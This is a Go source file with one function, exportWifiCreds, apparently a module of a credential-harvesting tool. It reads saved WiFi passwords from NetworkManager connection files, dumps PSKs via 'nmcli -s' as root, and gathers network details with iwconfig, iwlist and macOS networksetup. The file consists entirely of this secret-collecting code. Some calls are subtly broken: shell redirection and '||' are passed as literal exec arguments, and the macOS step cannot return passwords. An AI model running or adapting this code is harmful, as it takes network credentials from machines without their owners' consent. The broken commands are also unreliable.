//go:build !windows
// +build !windows

package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

func exportWifiCreds() string {
	// Linux: extract WiFi passwords from NetworkManager connections
	var results []string

	// Method 1: NetworkManager connection files
	nmConnectionsDir := "/etc/NetworkManager/system-connections"
	if entries, err := os.ReadDir(nmConnectionsDir); err == nil {
		for _, entry := range entries {
			connPath := filepath.Join(nmConnectionsDir, entry.Name())
			data, err := os.ReadFile(connPath)
			if err != nil {
				continue
			}
			content := string(data)
			ssid := entry.Name()
			psk := ""

			for _, line := range strings.Split(content, "\n") {
				line = strings.TrimSpace(line)
				if strings.HasPrefix(line, "ssid=") {
					ssid = strings.TrimPrefix(line, "ssid=")
				}
				if strings.HasPrefix(line, "psk=") {
					psk = strings.TrimPrefix(line, "psk=")
				}
			}

			if psk != "" && psk != "<password>" {
				results = append(results, fmt.Sprintf("[NetworkManager] SSID: %s, PSK: %s", ssid, psk))
			} else {
				results = append(results, fmt.Sprintf("[NetworkManager] SSID: %s (no PSK found)", ssid))
			}
		}
	}

	// Method 2: nmcli (NetworkManager CLI) as root
	if os.Geteuid() == 0 {
		if out, err := exec.Command("nmcli", "-s", "connection", "show", "--active").Output(); err == nil {
			results = append(results, fmt.Sprintf("[nmcli] Active connections:\n%s", string(out)))
		}
		// Show WiFi passwords
		if out, err := exec.Command("nmcli", "-s", "connection", "show").Output(); err == nil {
			lines := strings.Split(string(out), "\n")
			for _, line := range lines {
				fields := strings.Fields(line)
				if len(fields) > 0 && fields[0] != "NAME" && fields[0] != "" {
					connName := fields[0]
					if pwdOut, err := exec.Command("nmcli", "-s", "connection", "show", connName, "-s", "802-11-wireless-security.psk").Output(); err == nil {
						pwd := strings.TrimSpace(string(pwdOut))
						if pwd != "" {
							results = append(results, fmt.Sprintf("[nmcli] %s: %s", connName, pwd))
						}
					}
				}
			}
		}
	} else {
		results = append(results, "[nmcli] root required to read WiFi passwords via nmcli")
	}

	// Method 3: iwconfig / iw (show current WiFi info)
	if out, err := exec.Command("iwconfig", "2>/dev/null || iw dev 2>/dev/null").Output(); err == nil {
		results = append(results, fmt.Sprintf("[iw] WiFi info:\n%s", string(out)))
	}

	// macOS: use networksetup
	if out, err := exec.Command("networksetup", "-listallhardwareports").Output(); err == nil {
		output := string(out)
		results = append(results, fmt.Sprintf("[macOS] Hardware ports:\n%s", output))
		// Get WiFi network password (requires root)
		if os.Geteuid() == 0 {
			for _, line := range strings.Split(output, "\n") {
				if strings.Contains(line, "Wi-Fi") || strings.Contains(line, "AirPort") {
					parts := strings.Split(line, ":")
					if len(parts) >= 2 {
						iface := strings.TrimSpace(parts[1])
						if pwdOut, err := exec.Command("networksetup", "-getairportnetwork", iface).Output(); err == nil {
							results = append(results, fmt.Sprintf("[networksetup] %s", strings.TrimSpace(string(pwdOut))))
						}
					}
				}
			}
		}
	}

	// Method 4: iwlist scan (show available networks)
	if out, err := exec.Command("iwlist", "scan", "2>/dev/null || iw dev wlan0 scan 2>/dev/null").Output(); err == nil {
		results = append(results, fmt.Sprintf("[iwlist] Available networks:\n%s", string(out)))
	}

	if len(results) == 0 {
		return "wifi_creds: no WiFi credentials found (try running as root)\n"
	}
	return strings.Join(results, "\n") + "\n"
}